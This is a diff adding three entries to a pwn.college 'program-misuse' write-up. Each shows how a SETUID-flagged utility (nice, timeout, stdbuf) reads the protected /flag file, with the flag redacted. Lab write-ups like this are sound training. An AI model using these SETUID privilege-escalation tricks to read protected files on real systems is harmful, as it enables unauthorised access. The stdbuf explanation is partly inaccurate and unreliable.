@@ -380,7 +380,39 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 ```
 
 
+## 27. `nice`
+
+`nice` command is used to set priorities to the process and also run a process. Since we have SETUID binary set to the command we can use to read contents of the flag.
+
+```bash
+hacker@program-misuse~nice:/challenge$ nice cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
 
 
+## 28. `timeout`
+
+`timeout` command runs a specified command for a given period of time and after that time it terminates whatever command it was running before given it has not yet finished executing. The `s` is for seconds.
+
+```bash
+hacker@program-misuse~timeout:/challenge$ timeout 1s cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 29. `stdbuf`
+
+`stdbuf` command is used to handle the buffering behavior of the standard input(stdin). When input supplied from stdin (keyboard or mouse), this data is temporarily stored somewhere which is basically the buffer memory.
+
+`-i` => Input Mode
+`0` =>Unbuffered Mode (**Data read directly from the source**)
+`1` => Buffered Mode (**Data read indirectly since it gets stored into a temporary memory i.e. buffer memory**)
+
+The command basically tries to read data unbuffered from stdin by using the `cat` command.
+
+```bash
+hacker@program-misuse~stdbuf:/challenge$ stdbuf -i0 cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
 
 
